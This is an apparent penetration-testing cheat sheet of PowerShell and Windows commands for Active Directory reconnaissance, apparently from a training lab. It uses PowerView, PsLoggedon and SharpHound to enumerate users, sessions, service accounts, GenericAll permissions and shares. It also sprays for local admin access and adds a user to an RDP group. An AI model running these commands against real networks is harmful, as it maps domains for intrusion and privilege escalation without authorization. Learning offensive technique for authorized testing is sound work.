# Creating a map of an Active Directory domain:
#
# Users
# Groups
# Domain Information
# Domain joined computers
# Domain joined operating systems
# machines you can access as Local Administrator
# Current logon sessions on the domain
# SPNs (services integrated with AD)
# Enumerate for GenericAll ActiveDirectoryRights permissions 
# Enumerate domain shares
#

Import-Module .\PowerView.ps1

Get-NetDomain									# domain information

Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon					# dormant users

Get-NetGroup | select cn
Get-NetGroup "Remote Desktop Users" | select member				# group members

Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion	# OSes on the domain

Find-LocalAdminAccess								# spray the domain for machines accessible as admin

Get-NetSession -ComputerName web04.corp.com -Verbose		# command is unreliable
.\PsLoggedon.exe \\web04.corp.com				# enumerate the specified machine for logon sessions

Get-ObjectAcl -Identity krbtgt					# grab the ACEs applied to an object

setspn.exe -L krbtgt						# check if the user is a service account (has an SPN)
Get-NetUser -SPN | select samaccountname,serviceprincipalname	# grab all service accounts

Convert-SidToName <SID>
"<SID>","<SID>","<SID>" | Convert-SidToName

Get-ObjectAcl -Identity "<group-or-user-name>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights		# enumerate which objects have GenericAll over the specified object

net group "Remote Desktop Users" added_user /add /domain
net group "Remote Desktop Users" added_user /del /domain

Find-DomainShare
Find-DomainShare -CheckShareAccess					# enumerate accessible domain shares

ls \\dc1.corp.com\sysvol\corp.com\

Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\ -OutputPrefix "victim"
Invoke-BloodHound--CollectionMethod All --Loop --LoopDuration 01:15:00 --LoopInterval 00:10:00 -OutputDirectory C:\temp\ -OutputPrefix "victim"			# ingest for BloodHound on a loop


